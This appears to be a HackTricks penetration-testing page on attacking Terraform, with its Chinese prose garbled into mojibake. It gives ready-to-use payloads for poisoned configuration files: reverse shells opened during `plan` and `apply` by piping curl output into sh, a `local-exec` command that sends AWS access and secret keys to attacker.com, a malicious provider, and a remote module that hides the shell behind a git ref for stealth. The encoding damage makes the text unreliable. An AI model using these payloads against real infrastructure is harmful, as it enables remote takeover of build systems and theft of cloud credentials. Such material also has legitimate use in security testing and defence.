# Terraform å®‰å…¨æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

HashiCorp Terraform æ˜¯ä¸€ç§**åŸºç¡€è®¾æ–½å³ä»£ç å·¥å…·**ï¼Œå®ƒå…è®¸æ‚¨åœ¨å¯ç‰ˆæœ¬æ§åˆ¶ã€é‡ç”¨å’Œå…±äº«çš„äººç±»å¯è¯»é…ç½®æ–‡ä»¶ä¸­å®šä¹‰**äº‘å’Œæœ¬åœ°èµ„æº**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å·¥ä½œæµç¨‹æ¥é…ç½®å’Œç®¡ç†æ‚¨çš„æ‰€æœ‰åŸºç¡€è®¾æ–½çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚Terraform å¯ä»¥ç®¡ç†ä½çº§ç»„ä»¶ï¼Œå¦‚è®¡ç®—ã€å­˜å‚¨å’Œç½‘ç»œèµ„æºï¼Œä»¥åŠé«˜çº§ç»„ä»¶ï¼Œå¦‚ DNS æ¡ç›®å’Œ SaaS åŠŸèƒ½ã€‚

### Terraform å¦‚ä½•å·¥ä½œï¼Ÿ

Terraform é€šè¿‡äº‘å¹³å°å’Œå…¶ä»–æœåŠ¡çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ (API) åˆ›å»ºå’Œç®¡ç†èµ„æºã€‚æä¾›è€…ä½¿ Terraform èƒ½å¤Ÿä¸å‡ ä¹ä»»ä½•å…·æœ‰å¯è®¿é—® API çš„å¹³å°æˆ–æœåŠ¡ä¸€èµ·å·¥ä½œã€‚

![](<../../.gitbook/assets/image (33).png>)

HashiCorp å’Œ Terraform ç¤¾åŒºå·²ç»ç¼–å†™äº†**è¶…è¿‡ 1700 ä¸ªæä¾›è€…**æ¥ç®¡ç†æ•°åƒç§ä¸åŒç±»å‹çš„èµ„æºå’ŒæœåŠ¡ï¼Œè¿™ä¸ªæ•°å­—è¿˜åœ¨æŒç»­å¢é•¿ã€‚æ‚¨å¯ä»¥åœ¨ [Terraform æ³¨å†Œè¡¨](https://registry.terraform.io/)ä¸Šæ‰¾åˆ°æ‰€æœ‰å…¬å¼€å¯ç”¨çš„æä¾›è€…ï¼ŒåŒ…æ‹¬ Amazon Web Services (AWS)ã€Azureã€Google Cloud Platform (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDog ç­‰ç­‰ã€‚

Terraform çš„æ ¸å¿ƒå·¥ä½œæµç¨‹åŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼š

* **ç¼–å†™ï¼š** æ‚¨å®šä¹‰èµ„æºï¼Œè¿™äº›èµ„æºå¯èƒ½è·¨è¶Šå¤šä¸ªäº‘æä¾›å•†å’ŒæœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯èƒ½åˆ›å»ºä¸€ä¸ªé…ç½®ï¼Œåœ¨è™šæ‹Ÿç§æœ‰äº‘ (VPC) ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºä¸Šéƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œå¹¶å¸¦æœ‰å®‰å…¨ç»„å’Œè´Ÿè½½å‡è¡¡å™¨ã€‚
* **è®¡åˆ’ï¼š** Terraform åˆ›å»ºä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ï¼Œæè¿°åŸºäºç°æœ‰åŸºç¡€è®¾æ–½å’Œæ‚¨çš„é…ç½®å°†åˆ›å»ºã€æ›´æ–°æˆ–é”€æ¯çš„åŸºç¡€è®¾æ–½ã€‚
* **åº”ç”¨ï¼š** ç»è¿‡æ‰¹å‡†åï¼ŒTerraform æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œå»ºè®®çš„æ“ä½œï¼Œå°Šé‡ä»»ä½•èµ„æºä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ›´æ–°äº† VPC çš„å±æ€§å¹¶æ›´æ”¹äº†è¯¥ VPC ä¸­çš„è™šæ‹Ÿæœºæ•°é‡ï¼ŒTerraform å°†åœ¨æ‰©å±•è™šæ‹Ÿæœºä¹‹å‰é‡æ–°åˆ›å»º VPCã€‚

![](<../../.gitbook/assets/image (81).png>)

### Terraform ä¼ä¸šç‰ˆ

Terraform ä¼ä¸šç‰ˆå…è®¸æ‚¨åœ¨**è‡ªæ‰˜ç®¡çš„ Terraform Cloud ç‰ˆæœ¬**ä¸­è¿œç¨‹**è¿è¡Œå‘½ä»¤**ï¼Œå¦‚ `terraform plan` æˆ– `terraform apply`ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº†è®¿é—®è¯¥ Terraform æœåŠ¡å™¨çš„**API å¯†é’¥**ï¼Œæ‚¨å¯ä»¥**å±å®³å®ƒ**ã€‚\
æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Terraform å®éªŒå®¤

åªéœ€åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šå®‰è£… terraformã€‚

è¿™é‡Œæœ‰ä¸€ä¸ª[æŒ‡å—](https://learn.hashicorp.com/tutorials/terraform/install-cli)ï¼Œè¿™é‡Œæœ‰[ä¸‹è½½ terraform çš„æœ€ä½³æ–¹å¼](https://www.terraform.io/downloads)ã€‚

## Terraform ä¸­çš„ RCE

Terraform **æ²¡æœ‰æš´éœ²ç½‘é¡µæˆ–ç½‘ç»œæœåŠ¡çš„å¹³å°**æˆ‘ä»¬å¯ä»¥æšä¸¾ï¼Œå› æ­¤ï¼Œå±å®³ terraform çš„å”¯ä¸€æ–¹æ³•æ˜¯**èƒ½å¤Ÿæ·»åŠ /ä¿®æ”¹ terraform é…ç½®æ–‡ä»¶**ã€‚

ç„¶è€Œï¼Œterraform æ˜¯ä¸€ä¸ª**éå¸¸æ•æ„Ÿçš„ç»„ä»¶**ï¼Œå› ä¸ºå®ƒå°†æ‹¥æœ‰**ç‰¹æƒè®¿é—®**ä¸åŒä½ç½®ï¼Œä»¥ä¾¿æ­£å¸¸å·¥ä½œã€‚

æ”»å‡»è€…èƒ½å¤Ÿå±å®³è¿è¡Œ terraform çš„ç³»ç»Ÿçš„ä¸»è¦æ–¹å¼æ˜¯**å±å®³å­˜å‚¨ terraform é…ç½®çš„ä»“åº“**ï¼Œå› ä¸ºå®ƒä»¬åœ¨æŸä¸ªæ—¶åˆ»å°†è¢«**è§£é‡Š**ã€‚

å®é™…ä¸Šï¼Œæœ‰ä¸€äº›è§£å†³æ–¹æ¡ˆåœ¨åˆ›å»º PR åä¼š**è‡ªåŠ¨æ‰§è¡Œ terraform è®¡åˆ’/åº”ç”¨**ï¼Œä¾‹å¦‚ **Atlantis**ï¼š

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

å¦‚æœæ‚¨èƒ½å¤Ÿå±å®³ä¸€ä¸ª terraform æ–‡ä»¶ï¼Œå½“æœ‰äººæ‰§è¡Œ `terraform plan` æˆ– `terraform apply` æ—¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼æ‰§è¡Œ RCEã€‚

### Terraform è®¡åˆ’

Terraform è®¡åˆ’æ˜¯ terraform ä¸­**æœ€å¸¸ç”¨çš„å‘½ä»¤**ï¼Œå¼€å‘äººå‘˜/ä½¿ç”¨ terraform çš„è§£å†³æ–¹æ¡ˆä¸€ç›´åœ¨è°ƒç”¨å®ƒï¼Œå› æ­¤**è·å¾— RCE çš„æœ€ç®€å•æ–¹æ³•**æ˜¯ç¡®ä¿æ‚¨æ±¡æŸ“äº†ä¸€ä¸ªå°†åœ¨ `terraform plan` ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤çš„ terraform é…ç½®æ–‡ä»¶ã€‚

#### ä½¿ç”¨å¤–éƒ¨æä¾›è€…

Terraform æä¾›äº† [`external` æä¾›è€…](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ï¼Œå®ƒæä¾›äº†ä¸€ç§åœ¨ Terraform å’Œå¤–éƒ¨ç¨‹åºä¹‹é—´è¿›è¡Œæ¥å£çš„æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ `external` æ•°æ®æºåœ¨ `plan` æœŸé—´è¿è¡Œä»»æ„ä»£ç ã€‚

åœ¨ terraform é…ç½®æ–‡ä»¶ä¸­æ³¨å…¥ç±»ä¼¼ä»¥ä¸‹å†…å®¹å°†åœ¨æ‰§è¡Œ `terraform plan` æ—¶æ‰§è¡Œåå‘ shellï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### ä½¿ç”¨è‡ªå®šä¹‰æä¾›è€…

ä»»ä½•äººéƒ½å¯ä»¥ç¼–å†™ä¸€ä¸ª[è‡ªå®šä¹‰æä¾›è€…](https://learn.hashicorp.com/tutorials/terraform/provider-setup)å¹¶å°†å…¶å‘å¸ƒåˆ°[Terraform Registry](https://registry.terraform.io/)ã€‚æ‚¨ä¹Ÿå¯ä»¥å°è¯•ä»ç§æœ‰æ³¨å†Œè¡¨ä¸­æ‹‰å–è‡ªå®šä¹‰æä¾›è€…ã€‚

å°±æ˜¯è¿™æ ·ï¼š

* ç¼–å†™ä¸€ä¸ªè¿è¡Œæ¶æ„ä»£ç çš„è‡ªå®šä¹‰æä¾›è€…ï¼ˆå¦‚æ³„éœ²å‡­è¯æˆ–å®¢æˆ·æ•°æ®ï¼‰
* å°†å…¶å‘å¸ƒåˆ° Terraform Registry
* åœ¨åŠŸèƒ½åˆ†æ”¯ä¸­æ·»åŠ è¯¥æä¾›è€…åˆ° Terraform ä»£ç 
* ä¸ºåŠŸèƒ½åˆ†æ”¯æ‰“å¼€ä¸€ä¸ª PR
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
```markdown
ç”±äºæä¾›è€…å°†åœ¨ `init` æœŸé—´è¢«æ‹‰å…¥ï¼Œå¹¶åœ¨ `plan` æœŸé—´è¿è¡Œä¸€äº›ä»£ç ï¼Œä½ æœ‰ä»»æ„ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

ä½ å¯ä»¥åœ¨ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) æ‰¾åˆ°ä¸€ä¸ªä¾‹å­

#### ä½¿ç”¨å¤–éƒ¨å¼•ç”¨

ä¸Šè¿°ä¸¤ä¸ªé€‰é¡¹éƒ½å¾ˆæœ‰ç”¨ï¼Œä½†ä¸æ˜¯éå¸¸éšè”½ï¼ˆç¬¬äºŒä¸ªæ›´éšè”½ä½†æ¯”ç¬¬ä¸€ä¸ªå¤æ‚ï¼‰ã€‚ä½ å¯ä»¥é€šè¿‡éµå¾ªä»¥ä¸‹å»ºè®®ï¼Œä»¥æ›´**éšè”½çš„æ–¹å¼**æ‰§è¡Œæ­¤æ”»å‡»ï¼š

* ä¸å…¶ç›´æ¥å°† rev shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œä¸å¦‚**åŠ è½½åŒ…å« rev shell çš„å¤–éƒ¨èµ„æº**ï¼š
```
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
æ‚¨å¯ä»¥åœ¨ [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) æ‰¾åˆ°åå‘ shell ä»£ç 

* åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨ **ref** åŠŸèƒ½åœ¨ä»“åº“å†…éƒ¨çš„ä¸€ä¸ªåˆ†æ”¯ä¸­éšè— **terraform åå‘ shell ä»£ç **ï¼Œç±»ä¼¼äºï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform åº”ç”¨

Terraform apply å°†è¢«æ‰§è¡Œä»¥åº”ç”¨æ‰€æœ‰æ›´æ”¹ï¼Œæ‚¨ä¹Ÿå¯ä»¥é€šè¿‡æ³¨å…¥**æ¶æ„çš„ Terraform æ–‡ä»¶**ä¸ [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) æ¥æ»¥ç”¨å®ƒä»¥è·å¾— RCEã€‚\
æ‚¨åªéœ€ç¡®ä¿åƒä¸‹é¢è¿™æ ·çš„æœ‰æ•ˆè½½è·æœ€ç»ˆå‡ºç°åœ¨ `main.tf` æ–‡ä»¶ä¸­ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
éµå¾ª**å‰ä¸€æŠ€å·§çš„å»ºè®®**ï¼Œä½¿ç”¨**å¤–éƒ¨å¼•ç”¨**ä»¥æ›´éšç§˜çš„æ–¹å¼æ‰§è¡Œæ­¤æ”»å‡»ã€‚

## Secrets Dumps

æ‚¨å¯ä»¥é€šè¿‡åœ¨ terraform æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œè¿è¡Œ `terraform apply` æ¥**è½¬å‚¨ terraform ä½¿ç”¨çš„ç§˜å¯†å€¼**ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## å®¡è®¡å·¥å…·

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec ä½¿ç”¨é™æ€åˆ†æä½ çš„ terraform ä»£ç æ¥å‘ç°æ½œåœ¨çš„é…ç½®é”™è¯¯ã€‚
* [**terascan**](https://github.com/tenable/terrascan): Terrascan æ˜¯é’ˆå¯¹åŸºç¡€è®¾æ–½å³ä»£ç çš„é™æ€ä»£ç åˆ†æå™¨ã€‚

## å‚è€ƒèµ„æ–™

* [Atlantis å®‰å…¨](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
